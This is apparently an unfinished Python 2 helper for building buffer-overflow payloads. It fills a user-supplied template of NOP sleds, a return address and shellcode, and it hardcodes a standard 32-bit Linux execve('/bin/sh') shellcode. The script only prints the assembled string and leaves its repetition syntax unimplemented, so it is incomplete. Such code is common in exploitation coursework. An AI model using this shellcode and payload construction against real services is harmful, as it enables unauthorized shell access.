import sys
import subprocess


varList=[]
varDict={}
varIndexDict={}


def generateFinalCommand(commandList,typeReq):
    
    global varDict,varIndexDict
    
    print varDict
    print commandList
    
    if(typeReq):
        for i in range(len(commandList)):
            indexVar = commandList[i].find("$")
            if(commandList[i]!='' and (commandList[i][indexVar+1]!='_') and indexVar>=0 and varDict[commandList[i][indexVar:]]):
                    varIndexDict[commandList[i][indexVar:]]=i
                    commandList[i]=commandList[i][:indexVar]+varDict[commandList[i][indexVar:]]
                    
    else:
        for i in range(len(commandList)):
            indexVar = commandList[i].find("$")
            if(commandList[i]!='' and (commandList[i][indexVar+1]=='_') and indexVar>=0 and varDict[commandList[i][indexVar:]]):
                    varIndexDict[commandList[i][indexVar:]]=i
                    commandList[i]=commandList[i][:indexVar]+varDict[commandList[i][indexVar:]]
                   
    
    return commandList



def computeShellcode(shellcode):
    global varDict
   
    #Here we will compute shell code integrating c prog
    varDict['$shellcode']="\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80\x31\xc0\xb0\x01\x31\xdb\xcd\x80" 

    
    
def attackService(args):
    global varDict
    print args
    print varDict
    
    print "\n\n***************** Service Variables ******************"
    #replace service var starting with $_
    for i in range(len(args)):
        indexVar = args[i].find('$')
        
        if(indexVar>=0 and args[i][indexVar+1]=='_'):
            varDict[args[i]]=raw_input(args[i]+" : ")
    
    commandList = generateFinalCommand(args,0)
    finalCommand=""
    

    
    for i in range(len(commandList)):
        finalCommand+=commandList[i]+" "
    
    print finalCommand

    

#****** Instructions for attack command input ********
#all var must start with $
#if var starts with $_ then its a service var
#sample command "30*$nop $shellcode 40*$nop $address"
#shellcode must be in variable $shellcode
attackCommand = raw_input("Enter the attack command: ")

commandList = attackCommand.split(" ")
print commandList

for i in range(len(commandList)):
    indexVar = commandList[i].find("$")
    if(commandList[i]!='' and (commandList[i][indexVar+1])!='_' and indexVar>=0 and commandList[i][indexVar:] not in varList):
        varList.append(commandList[i][indexVar:])
        
if(varList):
    varDict={}
    for i in range(len(varList)):
        varDict[varList[i]]=raw_input(varList[i]+" : ")
         
    print varDict
    
print commandList

#Checking whether shellcode var there in the list of args
if('$shellcode' in varDict):
    computeShellcode(varDict['$shellcode']);
    
        
commandList = generateFinalCommand(commandList,1)
attackService(commandList)
print varIndexDict

print commandList